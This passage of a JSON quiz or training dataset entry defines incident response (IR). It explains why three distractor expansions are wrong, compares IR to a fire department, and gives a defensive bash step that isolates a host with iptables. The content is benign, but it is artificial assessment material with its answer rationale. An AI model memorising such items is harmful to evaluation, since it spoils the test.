      "distractor_analysis": "The distractors play on common misunderstandings of the &#39;I&#39; and &#39;R&#39; in IR. &#39;Information Recovery&#39; is a component of disaster recovery, not the full scope of incident response. &#39;Internal Review&#39; is a general business process. &#39;Intrusion Resolution&#39; is too narrow, focusing only on one aspect of the response process.",
      "analogy": "Think of IR like a fire department. When there&#39;s a fire (incident), they don&#39;t just put it out (resolution); they respond to the alarm, assess the situation, contain the fire, investigate the cause, and help with recovery efforts. That entire process is Incident Response."
    },
    "code_snippets": [
      {
        "language": "bash",
        "code": "# Common IR playbook step: Isolate affected host\nsudo iptables -A INPUT -s &lt;MALICIOUS_IP&gt; -j DROP\nsudo systemctl stop network-manager",
        "context": "A typical Incident Response playbook might include steps to isolate compromised systems to prevent further spread."
      }
    ],
    "difficulty": "intermediate",
    "question_type": "definition",
    "prerequisites": [
      "SEC_BASICS",
      "DEFENSE_DETECT"
    ]
  }
]